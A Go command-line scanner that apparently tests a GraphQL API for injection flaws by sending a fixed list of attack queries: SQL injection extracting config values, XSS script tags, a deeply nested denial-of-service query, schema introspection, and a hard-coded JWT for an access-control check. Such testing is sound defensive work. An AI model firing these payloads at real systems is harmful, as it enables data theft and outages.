package main

import (
	"context"
	"encoding/json"
	"flag"
	"log"
	"os"
	"strings"

	"github.com/machinebox/graphql"
)

var queries = []string{
	`query {
  users(filter: { role: "admin" }) {
    id
    name
    email
  }
}
`,
	`query IntrospectionQuery {
  __schema {
    queryType {
      name
    }
    mutationType {
      name
    }
    subscriptionType {
      name
    }
    types {
      ...FullType
    }
    directives {
      name
      description
      locations
      args {
        ...InputValue
      }
    }
  }
}
fragment FullType on __Type {
  kind
  name
  description
  fields(includeDeprecated: true) {
    name
    description
    args {
      ...InputValue
    }
    type {
      ...TypeRef
    }
    isDeprecated
    deprecationReason
  }
  inputFields {
    ...InputValue
  }
  interfaces {
    ...TypeRef
  }
  enumValues(includeDeprecated: true) {
    name
    description
    isDeprecated
    deprecationReason
  }
  possibleTypes {
    ...TypeRef
  }
}
fragment InputValue on __InputValue {
  name
  description
  type {
    ...TypeRef
  }
  defaultValue
}
fragment TypeRef on __Type {
  kind
  name
  ofType {
    kind
    name
    ofType {
      kind
      name
      ofType {
        kind
        name
        ofType {
          kind
          name
          ofType {
            kind
            name
            ofType {
              kind
              name
              ofType {
                kind
                name
              }
            }
          }
        }
      }
    }
  }
}`,
	`query brokenAccessControl {
  myInfo(accessToken:"eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJhdWQiOiJwb2MiLCJzdWIiOiJKdWxpZW4iLCJpc3MiOiJBdXRoU3lzdGVtIiwiZXhwIjoxNjAzMjkxMDE2fQ.r3r0hRX_t7YLiZ2c2NronQ0eJp8fSs-sOUpLyK844ew", veterinaryId: 2){
    id, name, dogs {
      name
    }
  }
}`,
	`query {
  users(filter: { role: "admin" }) {
    id
    name
    email
  }
}
`,
	`query sqli {
  dogs(namePrefix: "ab%' UNION ALL SELECT 50 AS ID, C.CFGVALUE AS NAME, NULL AS VETERINARY_ID FROM CONFIG C LIMIT ? -- ", limit: 1000) {
    id
    name
  }
}`,
	`query xss  {
  myInfo(veterinaryId:"<script>alert('1')</script>" ,accessToken:"<script>alert('1')</script>") {
    id
    name
  }
}`,
	`query dos {
  allDogs(onlyFree: false, limit: 1000000) {
    id
    name
    veterinary {
      id
      name
      dogs {
        id
        name
        veterinary {
          id
          name
          dogs {
            id
            name
            veterinary {
              id
              name
              dogs {
                id
                name
                veterinary {
                  id
                  name
                  dogs {
                    id
                    name
                    veterinary {
                      id
                      name
                      dogs {
                        id
                        name
                      }
                    }
                  }
                }
              }
            }
          }
        }
      }
    }
  }
}`,
	`query {
  Veterinary(id: "1") {
    name
  }
  second:Veterinary(id: "2") {
    name
  }
  third:Veterinary(id: "3") {
    name
  }
}`,
	`query {
  users(filter: { role: "admin" }) {
    id
    name
    email
  }
}
`,
	`query {
  auth(veterinaryName: "Julien")
  second: auth(veterinaryName:"Benoit")
}`,
	`query {
  users {
    id
    name
    email
    # You can add more fields as needed
  }
}
`,
	`query {
  user(id: "USER_ID") {
    id
    name
    email
    # Add more fields if needed
  }
}
`,
	`query {
  users(filter: { role: "admin" }) {
    id
    name
    email
  }
}
`,
	`query {
  users(page: 1, pageSize: 10) {
    id
    name
    email
  }
}
`,
}

func send(host string, query string) bool {
	ctx := context.Background()
	client := graphql.NewClient(host)

	// make a request
	req := graphql.NewRequest(query)

	// set any variables
	req.Var("key", "value")

	// run it and capture the response
	var respData json.Decoder
	if err := client.Run(ctx, req, &respData); err != nil {
		log.Println(err)

		return false
	}

	return true
}

func main() {
	log.SetOutput(os.Stdout)

	var (
		hostFlag      = flag.String("host", "localhost", "target host address")
		endpointsFlag = flag.String("endpoints", "/", "target specific endpoints")
		paramsFlag    = flag.String("params", "", "system parameters for testing")
	)

	flag.Parse()

	endpoints := strings.Split(*endpointsFlag, ",")
	paramSet := strings.Split(*paramsFlag, "&")

	params := make(map[string]string)

	for _, item := range paramSet {
		parts := strings.Split(item, "=")
		params[parts[0]] = parts[1]
	}

	log.Println(*hostFlag)
	log.Println(endpoints)
	log.Println(params)

	for _, query := range queries {
		if send(*hostFlag, query) {
			log.Println("Query executed in GraphQL injection attack!")

			os.Exit(1)
		}
	}

	log.Println("safe against GraphQL injection attacks!")

	os.Exit(0)
}
